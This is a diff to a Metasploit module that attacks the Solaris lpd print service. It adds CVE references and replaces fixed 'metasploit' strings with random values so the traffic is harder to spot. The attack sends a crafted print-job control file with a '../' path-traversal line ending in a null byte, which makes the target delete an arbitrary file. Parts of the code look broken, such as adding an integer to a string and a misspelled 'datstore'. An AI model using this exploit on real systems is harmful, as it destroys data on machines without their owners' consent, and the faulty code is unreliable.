@@ -1,5 +1,5 @@
 ##
-# $Id:$
+# $Id$
 ##
 
 ##
@@ -34,6 +34,9 @@ class Auxiliary::Dos::Solaris::Lpd::CascadeDelete < Msf::Auxiliary
 			'Version'        => '$Revision$',
 			'References'     =>
 				[
+					[ 'CVE', '2005-4797' ],
+					[ 'BID', '14510' ],
+					[ 'OSVDB', '18650' ],
 					[ 'URL', 'http://sunsolve.sun.com/search/document.do?assetkey=1-26-101842-1'],
 				]
 			))
@@ -47,8 +50,13 @@ class Auxiliary::Dos::Solaris::Lpd::CascadeDelete < Msf::Auxiliary
 
 	def run
 	
+	
+		r_hostname = rand_text_alpha(rand(8)+1)
+		r_user     = rand_text_alpha(rand(8)+1)
+		r_spool    = rand_text_alpha(rand(8)+1)
+		
 		# Create a simple control file...
-		control = "Hmetasploit\nPr00t\n";
+		control = "H#{r_hostname}\nP#{r_user}\n";
 	
 		# The job ID is squashed down to three decimal digits
 		jid   = ($$ % 1000).to_s + [Time.now.to_i].pack('N').unpack('H*')[0]
@@ -57,7 +65,7 @@ class Auxiliary::Dos::Solaris::Lpd::CascadeDelete < Msf::Auxiliary
 		sock1 = connect(false)
 		
 		# Request a cascaded job
-		sock1.put("\x02metasploit:framework\n")
+		sock1.put("\x02#{r_hostname}:#{r_spool}\n")
 		res = sock1.get_once
 		if (not res)
 			print_status("The target did not accept our job request command")
@@ -70,12 +78,12 @@ class Auxiliary::Dos::Solaris::Lpd::CascadeDelete < Msf::Auxiliary
 		# null byte will prevent the parser from processing the other paths.
 		control << "U" + ("../" * 10) + "#{datastore['RPATH']}\x00\n"
 
-		dataf = "http://metasploit.com/\n"
+		dataf = rand_text_alpha(100)+1
 		
 		print_status("Deleting #{datstore['RPATH']}...")
 		if (not (
-			send_file(sock1, 2, "cfA" + jid + "metasploit", control) and
-			send_file(sock1, 3, "dfa" + jid + "metasploit", dataf)
+			send_file(sock1, 2, "cfA" + jid + r_hostname, control) and
+			send_file(sock1, 3, "dfa" + jid + r_hostname, dataf)
 		   )    )
 		   	sock1.close
 			return
